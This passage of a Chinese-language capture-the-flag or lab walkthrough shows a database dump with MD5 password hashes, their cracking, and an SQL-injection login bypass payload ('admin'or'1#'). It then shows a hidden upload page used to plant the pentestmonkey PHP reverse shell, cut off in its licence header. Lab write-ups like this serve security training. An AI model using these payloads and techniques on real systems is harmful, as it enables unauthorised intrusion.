constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">username</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">password</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="242"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Administrator'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'0192023a7bbd73250516f069df18b500'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="243"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'John Smith'</span><span class="token punctuation">,</span> <span class="token string">'jsmith@sample.com'</span><span class="token punctuation">,</span> <span class="token string">'af606ddc433ae6471f104872585cf880'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="244"></td><td><pre></pre></td></tr><tr><td data-num="245"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="246"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> dumped tables</pre></td></tr><tr><td data-num="247"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="248"></td><td><pre></pre></td></tr><tr><td data-num="249"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="250"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="251"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="252"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="253"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="254"></td><td><pre></pre></td></tr><tr><td data-num="255"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="256"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="257"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="258"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="259"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="260"></td><td><pre></pre></td></tr><tr><td data-num="261"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="262"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="263"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="264"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="265"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="266"></td><td><pre></pre></td></tr><tr><td data-num="267"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="268"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="269"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="270"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="271"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="272"></td><td><pre></pre></td></tr><tr><td data-num="273"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="274"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="275"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="276"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="277"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="278"></td><td><pre></pre></td></tr><tr><td data-num="279"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="280"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="281"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="282"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="283"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="284"></td><td><pre></pre></td></tr><tr><td data-num="285"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="286"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="287"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="288"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="289"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="290"></td><td><pre></pre></td></tr><tr><td data-num="291"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="292"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="293"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="294"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="295"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="296"></td><td><pre></pre></td></tr><tr><td data-num="297"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="298"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="299"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="300"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="301"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="302"></td><td><pre></pre></td></tr><tr><td data-num="303"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="304"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="305"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="306"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="307"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="308"></td><td><pre></pre></td></tr><tr><td data-num="309"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="310"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> dumped tables</pre></td></tr><tr><td data-num="311"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="312"></td><td><pre></pre></td></tr><tr><td data-num="313"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="314"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="315"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="316"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="317"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="318"></td><td><pre></pre></td></tr><tr><td data-num="319"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="320"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="321"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="322"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="323"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="324"></td><td><pre></pre></td></tr><tr><td data-num="325"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="326"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="327"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="328"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="329"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="330"></td><td><pre></pre></td></tr><tr><td data-num="331"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="332"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="333"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="334"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="335"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="336"></td><td><pre></pre></td></tr><tr><td data-num="337"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="338"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="339"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="340"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="341"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="342"></td><td><pre></pre></td></tr><tr><td data-num="343"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="344"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="345"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="346"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="347"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="348"></td><td><pre></pre></td></tr><tr><td data-num="349"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="350"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="351"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="352"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="353"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="354"></td><td><pre></pre></td></tr><tr><td data-num="355"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="356"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="357"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="358"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="359"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="360"></td><td><pre></pre></td></tr><tr><td data-num="361"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="362"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="363"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="364"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="365"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="366"></td><td><pre></pre></td></tr><tr><td data-num="367"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="368"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="369"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="370"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="371"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="372"></td><td><pre><span class="token constant">COMMIT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="373"></td><td><pre></pre></td></tr><tr><td data-num="374"></td><td><pre><span class="token comment">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="375"></td><td><pre><span class="token comment">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="376"></td><td><pre><span class="token comment">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>不难发现我们想要的用户名和密码：</p>
<p>进行 md5 解密</p>
<p>得到 admin 的密码为：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224218652-1849272615.png" alt="" /></p>
<p>jsmith@sample.com 的密码为：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224232722-1726087958.png" alt="" /></p>
<p>使用 admin 登录，登录成功得到页面：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224249391-125136219.png" alt="" /></p>
<p>PS：这里的登录框存在 sql 注入，也可以使用万能密码 admin'or'1# 直接登录</p>
<p>右击检查网页源代码，这里给了一个 shell 路径，但是访问发现并不存在</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224306044-1185131377.png" alt="" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224322312-1073803224.png" alt="" /></p>
<p>往下发现一个注释掉的页面，访问发现可以上传文件</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string double-quoted-string">"index.php?page=site_settings"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"nav-item nav-site_settings"</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string single-quoted-string">'icon-field'</span><span class="token operator">></span><span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"fa fa-cogs text-danger"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span> System Settings<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224343329-880955792.png" alt="" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224357281-1299366159.png" alt="" /></p>
<p>上传一个 php-reverse-shell.php 文件，成功上传 php 文件，但是并没有返回保存路径</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// for any actions performed using this tool.  The author accepts no liability</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// do not use this tool.</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// In all other respects the GPL version 2 applies:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// This program is free software; you can redistribute it and/or modify</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// it under the terms of the GNU General Public License version 2 as</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// published by the Free Software Foundation.</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// This program is distributed in the hope that it will be useful,</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">// GNU General Public License for more details.</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">// You should have received a copy of the GNU General Public License along</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">// with this program; if not, write to the Free Software Foundation, 